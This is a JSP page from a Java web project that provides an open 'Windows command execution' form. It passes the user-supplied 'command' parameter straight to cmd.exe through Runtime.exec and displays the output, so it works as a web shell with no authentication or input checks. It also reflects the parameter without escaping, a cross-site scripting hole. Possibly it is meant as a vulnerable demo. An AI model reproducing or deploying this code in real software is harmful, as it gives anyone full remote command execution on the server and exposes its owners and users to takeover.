



<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8" import="love.linyi.controller.Code"%>
<%@ page import="java.io.*" %>
<html>
<script>
    // 定义全局变量存储上下文路径
    const contextPath = "${pageContext.request.contextPath}";
</script>
<script src="${pageContext.request.contextPath}/src/main/webapp/static/pages/css/hangbege.js"></script>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/src/main/webapp/static/pages/css/linyistyle.css">
    <title>Windows命令执行</title>

    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }

        pre { 
            background-color: #f0f0f0; 
            padding: 10px; 
            border-radius: 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        form { margin-bottom: 20px; }
        input[type="text"] { width: 70%; padding: 8px; }
        input[type="submit"] { padding: 8px 15px; }
        .warning {
            color: red;
            background-color: #ffecec;
            padding: 10px;
            border: 1px solid red;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .card-container {
            max-width:none;
            margin: 0rem ;
            padding: 5rem;
            display:grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            background:rgba(198, 18, 18, 0.5);

        }

        .card {
            background: rgb(191, 207, 221);
            color: rgb(29, 24, 24);
            border-radius: 10px;
            padding: 2rem;
            box-shadow: var(--box-shadow);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-20px);
            box-shadow: 50px 8px 12px rgba(0, 0, 0, 0.2);
        }

        /* 动画效果 */
        @keyframes fadeIn {
            from { opacity: 0.5; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            animation: fadeIn 1s ease forwards;
        }

        /* 响应式设计 */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }

            .hero-content h1 {
                font-size: 2.5rem;
            }
        }
    </style>
</head>
<body>
<div id="header"></div>
<main>
    <section class="hero">
        <div class="hero-content">
            <h1>mingl</h1>
            <h1><span id="message">m</span></h1>
        </div>
    </section>

    <div class="card-container">
        <div >
            <h1>Windows命令执行</h1>

            <form method="post">
                输入Windows命令:
                <input type="text" name="command" value="<%= request.getParameter("command") != null ?
            request.getParameter("command") : "ipconfig" %>">
                <input type="submit" value="执行">
            </form>

            <%
                String userCommand = request.getParameter("command");
                if (userCommand != null && !userCommand.trim().isEmpty()) {
                    StringBuilder output = new StringBuilder();
                    Process process = null;
                    BufferedReader reader = null;

                    try {
                        String[] cmdArray = {"cmd.exe", "/c", userCommand};

                        process = Runtime.getRuntime().exec(cmdArray);

                        reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                        String line;
                        while ((line = reader.readLine()) != null) {
                            output.append(line).append("\n");
                        }

                        reader = new BufferedReader(new InputStreamReader(process.getErrorStream(), "GBK"));
                        while ((line = reader.readLine()) != null) {
                            output.append("[ERROR] ").append(line).append("\n");
                        }

                        int exitValue = process.waitFor();
                        output.append("\n命令执行完成，退出码: ").append(exitValue);

                    } catch (Exception e) {
                        output.append("执行命令时出错: ").append(e.toString());
                    } finally {
                        if (reader != null) {
                            try { reader.close(); } catch (IOException e) {}
                        }
                        if (process != null) {
                            process.destroy();
                        }
                    }
            %>

            <h3>执行结果:</h3>
            <pre><%= output.toString() %></pre>
            <%
                }
            %>
        </div>
    </div>
</main>

<div id="footer"></div>
</body>
</html>